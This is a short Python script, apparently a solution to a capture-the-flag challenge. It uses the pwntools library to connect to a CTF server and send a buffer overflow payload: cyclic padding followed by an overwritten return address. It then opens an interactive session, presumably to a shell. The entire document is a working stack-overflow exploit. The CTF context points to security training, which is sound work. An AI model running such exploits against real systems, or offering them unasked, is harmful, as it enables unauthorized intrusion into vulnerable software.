from pwn import *
io = remote("ctf.hackucf.org", 9002)

payload = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa"
payload += b"\x56\x92\x04\x08"

io.sendline(payload)
io.interactive()